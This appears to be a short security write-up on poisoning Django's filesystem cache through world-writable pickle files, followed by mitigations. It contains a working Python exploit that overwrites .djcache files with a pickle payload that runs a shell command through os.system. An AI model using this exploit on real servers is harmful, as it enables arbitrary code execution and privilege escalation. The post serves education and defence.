---
title: "Django File Based Cache Poisoning"
created: 2024-09-27
modified: 2024-09-27
tags: ["LINUX", "PYTHON", "DJANGO"]
draft: false
---

## Information

Django comes with robust cache system so the different pages doesn't have to be calculated for each request.  You can choose the cache specific views or the entire site. It comes with three different caching methods:

* Memory Based Caching
* Database Based Caching
* Filesystem Based Caching

It's recommended to cache views that are static where the information rarely changes. The recommended caching method is memory based caching because it can handle high loads of data and increase the performance of Django application. However, it's suspectible for data loss if the server crashes.

## Vulnerability

In Django the Filesystem Based Caching has a vulnerability which allows threat actors to elevate their privileges if the cache file is writeable by all users. It allows attackers to modify the cache file to execute arbitrary code as the data is serialized using pickle.

```python title="Django Filesystem Based Caching Exploitation"
import pickle
import base64
import os
import time

cache_directory = "/var/tmp/django_cache"
cmd = "bash -c 'touch /tmp/pwned'"

class RCE:
        def __reduce__(self):
                return (os.system, (cmd,),)

payload = pickle.dumps(RCE())

for filename in os.listdir(cache_directory):
        if filename.endswith(".djcache"):
                path = os.path.join(cache_directory, filename)
                try:
                        os.remove(path)
                except:
                        continue
                with open(path, "wb") as f:
                        f.write(payload)
```

When a user visits a cached page a `.djcache` file is created inside of `/var/tmp/django_cache`. If the threat actor has read and write access to `.djcache` file they can overwrite the `.djcache` file to execute malicious code. The next time someone visits the cached page the response code will be 500, indicating that the poisoning was successful.

## Mitigations

The vulnerability can be mitigated in multiple of ways such as implementing strict permissions into the caching directory. And another option is also to use Memory Based Caching over Filesystem Based Caching as it's more effective and can increase the performance of the Django application.